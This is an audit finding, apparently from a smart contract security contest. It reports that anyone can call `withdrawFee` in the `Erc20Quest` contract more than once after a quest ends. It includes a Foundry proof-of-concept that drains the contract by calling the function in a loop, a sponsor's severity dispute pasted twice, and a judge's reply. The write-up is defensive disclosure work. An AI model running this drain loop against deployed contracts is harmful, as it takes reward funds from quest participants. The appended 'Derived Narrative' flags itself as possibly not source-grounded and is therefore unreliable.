---
id: 18058
severity: "High"
---

# Protocol fees can be withdrawn multiple times in `Erc20Quest`

## Description

The `withdrawFee` function present in the `Erc20Quest` contract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:
```solidity
function withdrawFee() public onlyAdminWithdrawAfterEnd {
    IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());
}
```
This function doesn’t provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.

## Proof of Concept

In the following demonstration, the `withdrawFee` function is called multiple times by a bad actor to remove all tokens from the quest contract.
```solidity
contract AuditTest is Test {
    address deployer;
    uint256 signerPrivateKey;
    address signer;
    address royaltyRecipient;
    address minter;
    address protocolFeeRecipient;

    QuestFactory factory;
    ReceiptRenderer receiptRenderer;
    RabbitHoleReceipt receipt;
    TicketRenderer ticketRenderer;
    RabbitHoleTickets tickets;
    ERC20 token;

    function setUp() public {
        deployer = makeAddr("deployer");
        signerPrivateKey = 0x123;
        signer = vm.addr(signerPrivateKey);
        vm.label(signer, "signer");
        royaltyRecipient = makeAddr("royaltyRecipient");
        minter = makeAddr("minter");
        protocolFeeRecipient = makeAddr("protocolFeeRecipient");

        vm.startPrank(deployer);

        // Receipt
        receiptRenderer = new ReceiptRenderer();
        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();
        receipt = RabbitHoleReceipt(
            address(new ERC1967Proxy(address(receiptImpl), ""))
        );
        receipt.initialize(
            address(receiptRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // factory
        QuestFactory factoryImpl = new QuestFactory();
        factory = QuestFactory(
            address(new ERC1967Proxy(address(factoryImpl), ""))
        );
        factory.initialize(signer, address(receipt), protocolFeeRecipient);
        receipt.setMinterAddress(address(factory));

        // tickets
        ticketRenderer = new TicketRenderer();
        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();
        tickets = RabbitHoleTickets(
            address(new ERC1967Proxy(address(ticketsImpl), ""))
        );
        tickets.initialize(
            address(ticketRenderer),
            royaltyRecipient,
            minter,
            0
        );

        // ERC20 token
        token = new ERC20("Mock ERC20", "MERC20");
        factory.setRewardAllowlistAddress(address(token), true);

        vm.stopPrank();
    }

    function signReceipt(address account, string memory questId)
        internal
        view
        returns (bytes32 hash, bytes memory signature)
    {
        hash = keccak256(abi.encodePacked(account, questId));
        bytes32 message = ECDSA.toEthSignedMessageHash(hash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);
        signature = abi.encodePacked(r, s, v);
    }

    function claimReceipt(address account, string memory questId) internal {
        (bytes32 hash, bytes memory signature) = signReceipt(account, questId);
        vm.prank(account);
        factory.mintReceipt(questId, hash, signature);
    }
    
    function test_Erc20Quest_ProtocolFeeWithdrawMultipleTimes() public {
        address alice = makeAddr("alice");
        address attacker = makeAddr("attacker");

        uint256 startTime = block.timestamp + 1 hours;
        uint256 endTime = startTime + 1 hours;
        uint256 totalParticipants = 1;
        uint256 rewardAmountOrTokenId = 1 ether;
        string memory questId = "a quest";

        // create, fund and start quest
        vm.startPrank(deployer);

        Erc20Quest quest = Erc20Quest(
            factory.createQuest(
                address(token),
                endTime,
                startTime,
                totalParticipants,
                rewardAmountOrTokenId,
                "erc20",
                questId
            )
        );

        uint256 rewards = totalParticipants * rewardAmountOrTokenId;
        uint256 fees = (rewards * factory.questFee()) / 10_000;
        deal(address(token), address(quest), rewards + fees);
        quest.start();

        vm.stopPrank();

        // simulate at least one user claims a receipt
        claimReceipt(alice, questId);

        // simulate time elapses until the end of the quest
        vm.warp(endTime);

        // The following can be executed by attacker (griefer) or by the fee recipient
        vm.startPrank(attacker);

        uint256 protocolFee = quest.protocolFee();
        uint256 withdrawCalls = (rewards + fees) / protocolFee;

        for (uint256 i = 0; i < withdrawCalls; i++) {
            quest.withdrawFee();
        }

        // Fee recipient has 100% of the funds
        assertEq(token.balanceOf(protocolFeeRecipient), rewards + fees);
        assertEq(token.balanceOf(address(quest)), 0);

        vm.stopPrank();
    }
}
```

## Recommendation

Add a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.

I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.

As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.

The owner understands how this function works, so they can be sure not to call it multiple times.

While I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.

As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.

The owner understands how this function works, so they can be sure not to call it multiple times.

`onlyAdminWithdrawAfterEnd` is not `onlyAdmin`, anyone can call `withdrawFee` after end.

I agree with @gzeon. This issue is a combination of two sub issues:

  * Anyone can call `withdrawFee()`
  * `withdrawFee()` can be called multiple times

Allowing it to be called by anyone is sufficient to rate it high severity.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the fee withdrawal mechanism of the Erc20Quest contract. After a quest reaches its end timestamp, the function withdrawFee can be invoked without any restriction on the caller because the onlyAdminWithdrawAfterEnd modifier does not enforce an admin-only check. The function simply transfers the amount returned by protocolFee() to the protocol fee recipient using a safe ERC20 transfer. Because the contract does not record whether the fee has already been paid, the same fee amount can be withdrawn repeatedly. An attacker, or any user, can call withdrawFee many times after the quest ends, each call sending the full protocol fee again. This repeated transfer drains the contract’s token balance, leaving it with zero funds while the fee recipient ends up with the total of the original rewards plus the accumulated fees. The impact is that participants who expected to receive their rewards find the contract empty and receive nothing, and the protocol fee recipient receives more tokens than the protocol fee calculation intended, effectively stealing funds from the contract. The issue occurs only after the quest end condition is satisfied, and it is triggered by the lack of a state flag or proper access control that would normally prevent multiple withdrawals. It was discovered during a formal audit when a test contract called withdrawFee in a loop and observed the contract balance drop to zero. The problem is subtle because the function’s name and single‑transfer logic suggest a one‑time operation, and developers may assume that only the admin will call it, overlooking that the modifier does not enforce this. To remediate, the contract should introduce a boolean flag (e.g., feeWithdrawn) that is set after the first successful transfer and checked on subsequent calls, and the access control should be tightened so that only the designated admin or fee recipient can invoke withdrawFee after the quest ends. This change ensures the protocol fee is paid exactly once, preserving the remaining token balance for legitimate reward distribution and preventing unauthorized fund extraction.
